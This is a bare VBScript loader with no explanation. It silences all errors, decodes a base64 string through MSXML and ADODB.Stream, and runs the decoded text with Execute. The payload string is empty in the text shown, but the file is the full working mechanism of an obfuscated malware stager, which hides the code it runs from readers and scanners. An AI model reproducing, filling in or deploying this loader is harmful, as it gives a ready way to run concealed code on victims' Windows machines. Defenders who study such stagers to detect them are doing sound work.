On Error Resume Next
Dim d:Set d=CreateObject("MSXML2.DOMDocument.6.0")
Dim e:Set e=d.CreateElement("b64")
e.DataType="bin.base64"
e.Text=""
Dim st:Set st=CreateObject("ADODB.Stream")
st.Type=1
st.Open
st.Write e.NodeTypedValue
st.Position=0
st.Type=2
st.CharSet="us-ascii"
Dim s:s=st.ReadText
st.Close
Execute s
